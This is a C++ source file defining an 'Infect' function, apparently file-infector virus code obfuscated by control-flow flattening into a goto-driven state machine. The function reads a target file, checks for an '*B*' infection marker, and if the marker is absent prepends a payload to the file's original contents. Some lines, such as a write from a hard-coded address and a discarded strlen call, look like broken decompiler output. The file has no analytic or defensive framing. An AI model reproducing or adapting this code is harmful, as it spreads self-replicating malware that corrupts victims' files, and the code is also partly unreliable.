#include "data_globals.h"
#include <fstream>    // added
#include <cstdlib>    // added for malloc/free
#include <cstring>    // added for strcmp, strlen
#pragma optimize("", off)

void Infect(char* filename, char* payload)
{
    volatile int dummy_state = 1;
    int dummy_return_stored = 0;
    std::ifstream in_file;
    std::streampos pos;
    int file_size = 0;
    int j = 0;
    bool done_free = false;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    in_file.open(filename, std::ios::in | std::ios::binary);
    in_file.seekg(0, std::ios::end);
    pos = in_file.tellg();
    file_size = static_cast<int>(pos);
    in_file.seekg(0, std::ios::beg);
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    Buffer = static_cast<char*>(malloc(static_cast<size_t>(file_size)));
    in_file.read(Buffer, static_cast<std::streamsize>(file_size));
    in_file.close();
    j = 0;
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    if (j < file_size) {
        if (Buffer[j] == '*' && Buffer[j + 1] == 'B' && Buffer[j + 2] == '*') {
            // Set Status to "YES" (Status is uint8_t[32])
            Status[0] = 'Y';
            Status[1] = 'E';
            Status[2] = 'S';
            Status[3] = '\0';
            dummy_state = 4;
            goto dummy_dispatcher;
        }
        ++j;
        goto dummy_state_3;
    }
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    if (strcmp(reinterpret_cast<const char*>(Status), "YES") != 0) {
        dummy_state = 5;
        goto dummy_dispatcher;
    } else {
        dummy_state = 6;
        goto dummy_dispatcher;
    }

dummy_state_5:
    {
        std::ofstream out_file(filename, std::ios::out | std::ios::binary);
        out_file << payload;
        strlen(&inf);
        out_file << reinterpret_cast<const char*>(0x140008164);
        out_file.write(Buffer, static_cast<std::streamsize>(file_size));
        out_file.close();
    }
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_6:
    free(Buffer);
    done_free = true;
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return;
}
#pragma optimize("", on)
